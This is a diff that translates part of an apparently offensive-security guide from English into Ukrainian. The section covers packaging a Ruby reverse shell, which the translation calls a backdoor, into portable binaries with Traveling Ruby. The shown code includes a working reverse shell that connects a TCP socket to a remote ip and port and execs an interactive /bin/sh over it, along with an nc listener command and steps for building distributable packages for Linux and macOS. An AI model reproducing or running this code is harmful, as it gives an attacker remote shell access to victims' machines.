@@ -89,18 +89,16 @@ nc -lvp 9911
 
 
 ### Мандруючий Рубі(Traveling-ruby)
+З офіційного сайту[^1] "*Мандруючий рубі - проект який постачає запаковані, портативні рубі програми, які можуть бути запущеними на всіх Лінукс та MAc OS X системах. Також існує підтримка систем Windows(з деякими обмеженнями). Це надає розробникам Рубі програм поставляти ці програми з їх Рубі кодом як один цілісний файл-пакет, без необхідності користувачам встановлювати рубі та геми.*"
 
-From official site[^1] "*Traveling Ruby is a project which supplies self-contained, "portable" Ruby binaries: Ruby binaries that can run on any Linux distribution and any OS X machine. It also has Windows support (with some caveats). This allows Ruby app developers to bundle these binaries with their Ruby app, so that they can distribute a single package to end users, without needing end users to first install Ruby or gems.*"
+Увага: Наступні інструкції взято з їх офіційного сайту.
 
-
-Note: The following script has been taken from the official docs.
-
-#### Preparation 
+#### Підготовка  
 ```
 mkdir rshell
 cd rshell
 ```
-- Create your application -in our case, reverse shell- in "rshell" folder
+- Напишіть програму -в нашому випадку бекдор- із теки "rshell"
 
 **rshell.rb**
 ```ruby
@@ -116,7 +114,7 @@ s = TCPSocket.open(ip,port).to_i
 exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
 
-- Test it 
+- Перевірте її
 
 ```
 ruby rshell.rb 
@@ -125,8 +123,8 @@ ruby rshell.rb
 
 
 
-##### Creating package directories
-The next step is to prepare packages for all the target platforms, by creating a directory each platform, and by copying your app into each directory. (Assuming that your application could differ from OS to another)
+##### Створення дерикторії з пакетом
+Наступним кроком є підготовка пакетів для всіє необхідних платформ. Для цього створимо окремі теки для кожної платформи й скопіюємо вашу програму в кожну з них(Припускаючи що ваша програма може трохи різнитися в залежності від платформи)
 
 ```
 mkdir -p rshell-1.0.0-linux-x86/lib/app
@@ -139,7 +137,7 @@ mkdir -p rshell-1.0.0-osx/lib/app/
 cp rshell.rb rshell-1.0.0-osx/lib/app/
 ```
 
-Next, create a `packaging` directory and download Traveling Ruby binaries for each platform into that directory. Then extract these binaries into each packaging directory. You can find a list of binaries at the Traveling Ruby Amazon S3 bucket. For faster download times, use the CloudFront domain "http://d6r77u77i8pq3.cloudfront.net". In this tutorial we're extracting version 20141215-2.1.5.
+Далі створіть теку `packaging` та завантажте Мандруючого Рубі(Traveling Ruby binaries) для кожної платформи у відповідні директорії. Ви можете також завантажити ці файли з "http://d6r77u77i8pq3.cloudfront.net". В цій книзі використано версію 20141215-2.1.5.
 
 ```
 mkdir packaging
@@ -154,7 +152,7 @@ mkdir rshell-1.0.0-linux-x86_64/lib/ruby && tar -xzf packaging/traveling-ruby-20
 mkdir rshell-1.0.0-osx/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.1.5-osx.tar.gz -C rshell-1.0.0-osx/lib/ruby
 ```
 
-Now, each package directory will have Ruby binaries included. It looks like this: Your directory structure will now look like this:
+Тепер в кожній теці ви матимете бінарний файл вашої програми. Це виглядатиме якось так:
 
 ```
 rshell/
